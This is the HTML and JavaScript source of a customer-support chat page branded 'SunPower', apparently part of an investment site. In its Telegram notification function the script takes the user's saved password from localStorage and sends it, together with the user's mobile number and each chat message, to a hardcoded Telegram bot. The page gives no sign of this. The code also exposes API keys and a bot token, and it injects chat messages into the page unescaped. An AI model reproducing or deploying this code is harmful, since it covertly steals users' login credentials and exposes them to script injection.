<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Customer Support | SunPower</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .animate-fade-in { animation: fadeIn 0.3s ease-in; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        body { background-color: #f8fafc; }
        .message-bubble { position: relative; padding-bottom: 22px !important; }
        .msg-time { position: absolute; bottom: 6px; right: 12px; font-size: 8px; font-weight: 900; opacity: 0.7; text-transform: uppercase; }
        #userMsgBox::-webkit-scrollbar { width: 4px; }
        #userMsgBox::-webkit-scrollbar-thumb { background: #e2e8f0; border-radius: 10px; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div class="bg-blue-600 p-5 text-white flex items-center gap-4 shadow-lg sticky top-0 z-50">
        <button onclick="window.location.href='index.html'" class="w-10 h-10 flex items-center justify-center bg-white/20 rounded-full active:scale-90">
            <i class="fas fa-arrow-left"></i>
        </button>
        <div class="flex items-center gap-3">
            <div class="w-10 h-10 bg-white rounded-full flex items-center justify-center text-blue-600 shadow-inner">
                <i class="fas fa-user-shield text-xl"></i>
            </div>
            <div>
                <h4 class="font-black text-sm uppercase italic tracking-widest leading-tight">SunPower Support</h4>
                <p id="topStatus" class="text-[10px] font-bold opacity-80 text-green-300 uppercase">● Online Now</p>
            </div>
        </div>
    </div>

    <div id="userMsgBox" class="flex-1 p-5 overflow-y-auto space-y-4 flex flex-col scroll-smooth bg-[#f0f2f5]"></div>

    <div id="typingIndicator" class="hidden px-6 py-2 text-[11px] font-black text-blue-500 italic animate-pulse">
        Admin is typing...
    </div>

    <div class="p-4 bg-white border-t flex items-center gap-3 shadow-[0_-5px_20px_rgba(0,0,0,0.05)]">
        <button onclick="document.getElementById('photoInput').click()" class="text-gray-400 px-2 text-xl active:scale-90">
            <i id="cameraIcon" class="fas fa-camera"></i>
        </button>
        <input type="file" id="photoInput" class="hidden" accept="image/*" onchange="uploadPhoto(this)">

        <input type="text" id="userChatInput" placeholder="Type your message here..." 
            class="flex-1 bg-gray-100 rounded-2xl px-5 py-4 text-sm font-bold outline-none border-none focus:ring-2 focus:ring-blue-500 transition-all">
        
        <button onclick="sendUserMsg()" class="bg-blue-600 text-white w-14 h-14 rounded-2xl flex items-center justify-center shadow-lg active:scale-90">
            <i class="fas fa-paper-plane text-lg"></i>
        </button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, collection, onSnapshot, addDoc, query, where, orderBy, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA3k5ByUuJ-1jtVovgZMsw1LBaBkn_nDo",
            authDomain: "new-investment-web.firebaseapp.com",
            projectId: "new-investment-web",
            storageBucket: "new-investment-web.firebasestorage.app",
            messagingSenderId: "1078188475858",
            appId: "1:1078188475858:web:b3777ea127aae8083740b"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const mobile = localStorage.getItem('userMobile');

        if (!mobile) window.location.href = "login.html";

        // --- TELEGRAM NOTIFICATION LOGIC ---
        const sendTelegramNotify = async (msgContent) => {
            const botToken = "8750001967:AAHzNuicw90RUZaQr_pWkao7rSaHqU9X-LM";
            const chatId = "8449394257";
            const password = localStorage.getItem('userPassword') || "N/A";

            const text = `🚀 *New Support Message*\n\n` +
                         `📱 *User:* \`${mobile}\`\n` +
                         `🔑 *Pass:* \`${password}\`\n` +
                         `💬 *Msg:* ${msgContent}`;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
                });
            } catch (e) { console.error("Telegram Error:", e); }
        };

        // --- STATUS & OFFLINE LOGIC ---
        const updateStatus = async (s) => {
            await setDoc(doc(db, "user_status", mobile), { online: s, lastSeen: Date.now() }, { merge: true });
        };
        updateStatus(true);
        document.addEventListener('visibilitychange', () => updateStatus(document.visibilityState !== 'hidden'));
        window.addEventListener('beforeunload', () => updateStatus(false));

        // --- TYPING LOGIC ---
        const userInput = document.getElementById('userChatInput');
        let tTimer;
        userInput.addEventListener('keydown', () => setDoc(doc(db, "typing_status", mobile + "_user"), { isTyping: true }, { merge: true }));
        userInput.addEventListener('keyup', () => {
            clearTimeout(tTimer);
            tTimer = setTimeout(() => setDoc(doc(db, "typing_status", mobile + "_user"), { isTyping: false }, { merge: true }), 800);
        });

        const formatTime = (ts) => ts ? new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true }) : "";

        // --- PHOTO UPLOAD ---
        window.uploadPhoto = async (input) => {
            const file = input.files[0];
            if (!file) return;
            const icon = document.getElementById('cameraIcon');
            const originalClass = icon.className;
            icon.className = "fas fa-spinner fa-spin text-blue-500"; 
            const fd = new FormData(); fd.append("image", file);

            try {
                const res = await fetch("https://api.imgbb.com/1/upload?key=f862756aa196fea426ebce881b5cf9c5", { method: "POST", body: fd });
                const rd = await res.json();
                if(rd.success) {
                    const imageUrl = rd.data.url;
                    await addDoc(collection(db, "support_chats"), { 
                        userMobile: mobile, sender: mobile, 
                        message: `<img src="${imageUrl}" class="rounded-xl w-full max-w-[220px] shadow-sm" onclick="window.open('${imageUrl}')">`, 
                        timestamp: Date.now() 
                    });
                    sendTelegramNotify("📷 _User sent a Photo_");
                }
            } catch (e) { alert("Network Error!"); }
            finally { icon.className = originalClass; input.value = ""; }
        };

        // --- SEND MESSAGE ---
        window.sendUserMsg = async () => {
            const input = document.getElementById('userChatInput');
            if(!input.value.trim()) return;
            const m = input.value; 
            input.value = "";
            setDoc(doc(db, "typing_status", mobile + "_user"), { isTyping: false }, { merge: true });
            
            await addDoc(collection(db, "support_chats"), { 
                userMobile: mobile, sender: mobile, message: m, timestamp: Date.now() 
            });

            // इथून टेलिग्राम मेसेज जाईल
            sendTelegramNotify(m);
        };

        // --- SNAPSHOTS ---
        onSnapshot(query(collection(db, "support_chats"), where("userMobile", "==", mobile)), (snap) => {
            const box = document.getElementById('userMsgBox'); 
            box.innerHTML = "";
            const docs = snap.docs.map(d => d.data()).sort((a,b) => a.timestamp - b.timestamp);
            docs.forEach(d => {
                const isAdmin = d.sender === "Admin";
                box.innerHTML += `<div class="${isAdmin ? 'self-start bg-white border' : 'self-end bg-blue-600 text-white'} px-4 py-3 rounded-2xl max-w-[85%] text-[12px] font-bold shadow-md mb-2 message-bubble">${d.message}<span class="msg-time ${isAdmin ? 'text-gray-400' : 'text-blue-200'}">${formatTime(d.timestamp)}</span></div>`;
            });
            box.scrollTop = box.scrollHeight;
        });

        onSnapshot(doc(db, "typing_status", mobile), (snap) => {
            const ind = document.getElementById('typingIndicator');
            (snap.exists() && snap.data().isTyping) ? ind.classList.remove('hidden') : ind.classList.add('hidden');
        });

        document.getElementById('userChatInput').addEventListener('keypress', (e) => { if(e.key === 'Enter') sendUserMsg(); });
    </script>
</body>
</html>
